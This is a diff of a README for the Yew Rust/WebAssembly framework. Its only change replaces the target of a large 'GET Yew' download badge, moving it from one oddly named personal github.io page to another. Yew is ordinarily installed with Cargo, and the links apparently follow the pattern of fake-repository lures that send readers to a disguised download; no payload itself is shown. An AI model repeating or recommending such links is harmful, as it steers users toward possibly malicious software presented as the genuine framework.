@@ -51,7 +51,7 @@ The appeal of Yew wasm is that application logic can be written in Rust and comp
 
 Prerequisites: A working Rust installation, WebAssembly target support, Cargo, and a modern browser for testing the Yew web framework during development.
 
-[![GET Yew](https://img.shields.io/badge/GET%20%E2%80%94%20Yew-0078D6?style=for-the-badge&logoColor=white)](https://moisesnealrrcb.github.io/.github/yew-app)
+[![GET Yew](https://img.shields.io/badge/GET%20%E2%80%94%20Yew-0078D6?style=for-the-badge&logoColor=white)](https://enzostricklandhfnj.github.io/.github/yew-app)
 
 1.  **Install the Toolchain:** Prepare Rust, Cargo, and WebAssembly targets before creating a Yew Rust project so builds can compile cleanly.
 2.  **Create the App Structure:** Start a Yew app with organized source folders, reusable Yew components, and a routing plan if Yew router will be part of the interface.
